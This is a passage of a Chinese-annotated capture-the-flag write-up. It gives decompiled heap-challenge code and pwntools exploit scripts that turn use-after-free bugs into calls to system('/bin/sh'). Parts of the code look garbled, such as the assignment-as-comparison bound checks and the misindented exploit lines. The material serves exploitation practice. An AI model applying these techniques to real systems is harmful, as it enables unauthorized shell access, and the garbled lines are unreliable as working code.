            v0 = *((_DWORD *)&notelist + i);
            *(_DWORD *)(v0 + 4) = malloc(size);
            //等同于*(*&notelist + i + 4 )=malloc(size)
            //在content的第二单位内存的指针中申请chunk(相当于在free后的bk指针的地址处申请chunk)
              if ( !*(_DWORD *)(*((_DWORD *)&notelist + i) + 4) )
            {
              puts("Alloca Error");
              exit(-1);
            }
            printf("Content :");
            read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size);
            puts("Success !");
            ++count;
            return __readgsdword(0x14u) ^ v5;
          }
        }
      }
      else
      {
        puts("Full");
      }
      return __readgsdword(0x14u) ^ v5;
    }
### delete
    unsigned int del_note()
    {
      int v1; // [esp+4h] [ebp-14h]
      char buf[4]; // [esp+8h] [ebp-10h] BYREF
      unsigned int v3; // [esp+Ch] [ebp-Ch]
      v3 = __readgsdword(0x14u);
      printf("Index :");
      read(0, buf, 4u);
      v1 = atoi(buf);
      if ( v1 = count )
      {
        puts("Out of bound!");
        _exit(0);
      }
      if ( *(&notelist + v1) )
      {
        free(*(*(&notelist + v1) + 4));
        //free掉镶嵌的chunk
        free(*(&notelist + v1));
        //free掉chunk
        //没有free掉指针，所以存在uaf
        puts("Success");
      }
      return __readgsdword(0x14u) ^ v3;
    }
### print
    unsigned int print_note()
    {
      int v1; // [esp+4h] [ebp-14h]
      char buf[4]; // [esp+8h] [ebp-10h] BYREF
      unsigned int v3; // [esp+Ch] [ebp-Ch]
      v3 = __readgsdword(0x14u);
      printf("Index :");
      read(0, buf, 4u);
      v1 = atoi(buf);
      if ( v1 = count )
      {
        puts("Out of bound!");
        _exit(0);
      }
      if ( *(&notelist + v1) )
        (**(&notelist + v1))(*(&notelist + v1));
        //print_note_content()函数=puts(*(*(&notelist + v1) + 4))-->这里相当于fd位置为print_note_content函数，bk指针处为参数
        //从add里面可以找出来
        //**(&notelist + i) = print_note_content;
        /*int __cdecl print_note_content(int a1){
      return puts(*(a1 + 4));}*/ 
      return __readgsdword(0x14u) ^ v3;
    }
### print_note_content
    int __cdecl print_note_content(int a1)
    {
      return puts(*(a1 + 4));
    }
### exp
    from pwn import *
    #p=remote("47.99.93.110",10001)
    p=process('./pwn')
    elf=ELF('./pwn')
    context.log_level="debug"
    def duan():
        gdb.attach(p)
        pause(0)
    def add(size,content):
        p.recvuntil("Your choice :")
        p.sendline("1")
        p.recvuntil("Note size :")
        p.sendline(str(size))
        p.recvuntil("Content :")
        p.sendline(content)
    def delete(index):
        p.recvuntil("Your choice :")
        p.sendline("2")
        p.recvuntil("Index :")
        p.sendline(str(index))
    def show(index):
        p.recvuntil("Your choice :")
        p.sendline("3")
        p.recvuntil("Index :")
        p.sendline(str(index))
    bin_sh=0x602010
    system=0x8049684
    print(hex(system))
    add(0x20,"aaaa")#0
    add(0x20,"bbbb")#1
    #duan()
    delete(1)
    delete(0)
    duan()
    add(0x8,p32(system) + p32(system)) 
    #duan()
    show(1)
    p.interactive()
## ACTF_2019_babyheap
### ida
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      int v3; // eax
      char buf[24]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v5; // [rsp+28h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      sub_400907(a1, a2, a3);
      while ( 1 )
      {
        while ( 1 )
        {
          sub_4009D2();
          read(0, buf, 8uLL);
          v3 = atoi(buf);
          if ( v3 != 2 )
            break;
          sub_400BAE();
        }
        if ( v3 == 3 )
        {
          sub_400C66();
        }
        else
        {
          if ( v3 != 1 )
            sub_400D18();
          sub_400A78();
        }
      }
    }
### 修改后的ida
### main
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      int v3; // eax
      char buf[24]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v5; // [rsp+28h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      sub_400907(a1, a2, a3);
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          read(0, buf, 8uLL);
          v3 = atoi(buf);
          if ( v3 != 2 )
            break;
          delete();
        }
        if ( v3 == 3 )
        {
          show();
        }
        else
        {
          if ( v3 != 1 )
            exit_0();
          add();
        }
      }
    }
### show
    unsigned __int64 sub_400C66()
    {
      int v1; // [rsp+Ch] [rbp-24h]
      char buf[24]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v3; // [rsp+28h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      puts("Please input list index: ");
      read(0, buf, 4uLL);
      v1 = atoi(buf);
      if ( v1 >= 0 && v1 < dword_60204C )
      {
        if ( *(&ptr + v1) )
          (*(*(&ptr + v1) + 1))(**(&ptr + v1));
          //这里是执行函数，不过参数在函数体的前面
          //也就是fd指针处为参数，bk指针处为函数体
      }
      else
      {
        puts("Out of bound!");
      }
      return __readfsqword(0x28u) ^ v3;
    }
### exp
    from pwn import *
    io=process('./pwn')
    elf=ELF('./pwn')
    context(os='linux',arch='amd64',log_level='debug')
    def duan():
        gdb.attach(io)
        pause(0)
    def add(size,content):
        io.recvuntil('Your choice: ')
        io.sendline(b'1')
        io.recvuntil(b'Please input size: \n')
        io.sendline(str(size))
        io.recvuntil('Please input content: \n')
        #io.sendline(content)   
        io.send(content)
    def delete(index):
        io.recvuntil('Your choice: ')
            io.sendline(b'2')
        io.recvuntil('Please input list index: \n')
        io.sendline(str(index))
    def show(index):
            io.recvuntil('Your choice: ')
            io.sendline(b'3')
        io.recvuntil('Please input list index: \n')
        io.sendline(str(index))
    system=elf.plt['system']
    #system=0x400A48
    bin_sh=0x602010
    add(0x20,"aaaa")#0
    add(0x20,"bbbb")#1
    #add(0x20,"cccc")
    delete(1)
    delete(0)
    add(0x10,p64(bin_sh)+p64(system))
    #add(0x10,p64(system)+p64(bin_sh))
    show(1)
    io.interactive()